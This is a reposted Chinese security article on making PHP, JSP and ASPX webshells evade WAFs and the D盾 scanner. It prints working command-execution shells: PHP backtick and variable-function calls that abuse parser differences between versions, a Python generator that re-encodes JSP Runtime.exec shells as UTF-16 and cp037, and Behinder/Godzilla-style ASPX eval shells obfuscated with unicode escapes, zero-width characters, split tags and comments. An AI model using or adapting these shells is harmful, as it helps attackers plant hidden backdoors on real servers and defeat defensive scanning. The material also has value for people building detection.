作者：Icepaper

原文地址：https://xz.aliyun.com/t/10937

php的免杀
------

* * *

传统的php免杀不用多说了 无非就是各种变形和外部参数获取，对于一些先进的waf和防火墙来说，不论如何解析最终都会到达命令执行的地方，但是如果语法报错的话，就可能导致解析失败了，这里简单说几个利用php版本来进行语义出错的php命令执行方式。

### 一、利用在高版本php语法不换行来执行命令

```
<?=  
$a=<<< aa  
assasssasssasssasssasssasssasssasssasssasssassss  
aa;echo `whoami`  
?>
```

#### 5.2版本报错

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUdvaf8aLq4kN0ev5hlnZp7MdgA6vWE1RAhtbJ1OrSoFWeqMcoU5JXicg/640?wx_fmt=png)

#### 5.3报错

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUlkO3gLJmwQQbnkMyveHzZYe6MqHmE9p677mW6PZibZGkfRpGTgtHqFQ/640?wx_fmt=png)

#### 5.4版本报错

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUyA10mMt1hJVfmdhsunhfmVL5orGqXOsZlWvKiawlSRmDK8J8RLMQ3EQ/640?wx_fmt=png)

#### 7.3.4成功执行命令

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUIsBRsmBvT5oH2LTt0yADcibkQMhz5RK6LGzpVoOSAQPgYy2Ah2RcD3g/640?wx_fmt=png)

### 3、利用\\特殊符号来引起报错

```
<?php  
\echo `whoami`;?>
```

#### 5.3执行命令失败

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUAwrv7YeHI0icXPGBoZmYUPasUXDrXDOfoibGsPEXpPRYpDgvT7CA5R3Q/640?wx_fmt=png)

#### 7.3执行命令失败

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUovPwXQd7tNYTKVHRTD4sgNoxC2BFzpKEtt4jNPkNCDXwia8Btov8EFQ/640?wx_fmt=png)

#### 5.2成功执行

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUMibkRMC8WlZibD2TmwFKaeUIr7yEqLgFVfYDIoHHFfp9azf9tVs1WMlQ/640?wx_fmt=png)

3、十六进制字符串
---------

在php7中不认为是数字，php5则依旧为数字

经过测试 5.3 和5.5可以成功执行命令，5.2和php7无法执行

```
<?php  
$s=substr("aabbccsystem","0x6");  
$s(whoami)  
?>
```

#### 7.3 命令执行失败

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUVaTqnC3mQGl1IUAia0DFYsmyYMbaw7NLK6IGicxCojzoTqyCTFBMG3ug/640?wx_fmt=png)

#### 5.2 命令执行失败

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCU1KQicUwXpwQJXsqlBeqsLPrA5lIKpO3cIRicPpFrBptftibQWg8gCKtag/640?wx_fmt=png)

### 5.3 命令执行成功

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCU1KQicUwXpwQJXsqlBeqsLPrA5lIKpO3cIRicPpFrBptftibQWg8gCKtag/640?wx_fmt=png)

除此之外，还有很多种利用版本差异性来bypass一些没有对所有版本进行检测更新的所谓的"先进waf"。

当然，对于我们可以结合垃圾数据，变形混淆，以及大量特殊字符和注释的方式来构造更多的payload,毕竟每家的waf规则不同，配置也不同，与一些传输层面的bypass进行结合产生的可能性就会非常多样。

例如：  
7.0版本的??特性，如果版本为5.x的话就会报错，可以结合一些其他的方式吧

```
<?php  
$a = $_GET['function'] ?? 'whoami';  
$b = $_GET['cmd'] ?? 'whoami';  
$a(null.(null.$b));
```

jsp免杀
-----

* * *

本人对java研究的不是非常深入，因此主要分享的还是平时收集的几个小tips，如果有没看过的师傅现在看到了也是极好的，java unicode绕过就不再多言。

#### 0、小小Tips

jsp的后缀可以兼容为jspx的代码，也兼容jspx的所有特性，如CDATA特性。

jspx的后缀不兼容为jsp的代码，jspx只能用jspx的格式

#### 1、jspx CDATA特性

在XML元素里，<和&是非法的，遇到<解析器会把该字符解释为新元素的开始，遇到&解析器会把该字符解释为字符实体化编码的开始。

但是我们有时候有需要在jspx里添加js代码用到大量的<和&字符，因此可以将脚本代码定义为CDATA。

CDATA部分内容会被解析器忽略。  
格式：<!\[CDATA\[xxxxxxxxxxxxxxxxxxx\]\]>  
例如  
String cmd = request.getPar<!\[CDATA\[ameter\]\]>("shell");  
此时ameter依旧会与getPar拼接成为getParameter

#### 2、实体化编码

```
if (cmd !=null){  
        Process child = Runtime.getRuntime().exec(cmd);  
        InputStream in = child.getInputStream();
```

这里实体化编码先知渲染体现不出来

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUeVmzNYUctUWxT0hGgdiaUXHxlnA0IxHgOX5JicTricSfEn8ToOibliakViaA/640?wx_fmt=png)

#### 3、利用java支持其他编码格式来进行绕过

```
#python2  
charset = "utf-8"  
data = '''<%Runtime.getRuntime().exec(request.getParameter("i"));%>'''.format(charset=charset)

f16be = open('utf-16be.jsp','wb')  
f16be.write('<%@ page contentType="charset=utf-16be" %>')  
f16be.write(data.encode('utf-16be'))

f16le = open('utf-16le.jsp','wb')  
f16le.write('<jsp:directive.page contentType="charset=utf-16le"/>')  
f16le.write(data.encode('utf-16le'))

fcp037 = open('cp037.jsp','wb')  
fcp037.write(data.encode('cp037'))  
fcp037.write('<%@ page contentType="charset=cp037"/>')


```

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUAZwH9CWqUhuic0frAmicvtoVXom9d0h9iaCf9nVK1Zic0jwwWWZxibQWE3w/640?wx_fmt=png)

可以看到对于D盾的免杀效果还是非常好的。  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUZ9d18gvQVmzN6ImeIaTicjoVaTzCiaicdErVDehAHLeJA3UA5RWesC80Q/640?wx_fmt=png)

aspx的免杀
-------

* * *

aspx免杀的方式相对于PHP和java的较少，这里列出5种方式来bypass进行免杀

1、unicode编码  
2、空字符串连接  
3、<%%>截断  
3、头部替换  
5、特殊符号@  
6、注释

我们以一个普通的冰蝎马作为示例

<%@ Page Language="Jscript"%>eval(@Request.Item\["pass"\],"unsafe");%

这一步无需多言，一定是会被D盾所查杀的

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUusqjDv6SibZNAPhqTut0HFaqialbIHOrgVHcxHK1VHGyhdKDODRjF5fA/640?wx_fmt=png)

#### 1、unicode编码

例如eval他可以变为  
\\u0065\\u0076\\u0061\\u006c

```
<%@ Page Language="Jscr`ipt"%><%\u0065\u0076\u0061\u006c(@Request.Item["pass"],"unsafe");%>`
```

经过我本地的测试，在JScript的情况下它不支持大U和多个0的增加  
而在c#的情况下，是可以支持的

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUZvT64xYcPNucRAJFpabmDYdA372vUxGV4BbpBJzL70xPfHZKJNwofw/640?wx_fmt=png)

#### 2、空字符串连接

在函数字符串中插入这些字符都不会影响脚本的正常运行，在测试前需要注意该类字符插入的位置，否则插入错误的地方会产生报错  
\\u200c  
\\u200d  
\\u200e  
\\u200f

#### 3、使用<%%>语法

将整个字符串与函数利用<%%>进行分割

```
<%@Page `Language=JS%><%eval%><%(Request.%><%Item["pass"],"unsafe");%>`
```

#### 4、头部免杀

之前有遇到过检测该字段的<%@ Page Language="C#" %>，这个是标识ASPX的一个字段，  
针对该字段进行免杀%@Language=CSHARP% 很久之前修改为这样就过了

同样的，可以修改为  
<%@ Page Language="Jscript"%>------》<%@Page Language=JS%>  
也可以将该字段放在后面，不一定要放前面等

#### 5、使用符号

如哥斯拉webshell存在特征代码，可以添加@符号但是不会影响其解析。

```
(Context.Session["payload"] == null)  
(@Context.@Session["payload"] == null)
```

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUibFnVLP7jY3QpkXnMiam9r3d7jMCibCyKR43Ugj1WdtwUZLEMA5Xspn4A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUayzH4qNRgQsicCbE5Uuc0m3OWkibGXf7x5qKFayaaAib0ia4sISBuCcoOA/640?wx_fmt=png)

#### 6、注释可以随意插入

如下所示为冰蝎部分代码

```
<%/*qi*/Session./*qi*/Add(@"k"/*qi*/,/*qi*/"e45e329feb5d925b"/*qi*/)
```

可以与<%%>结合使用效果会更好'
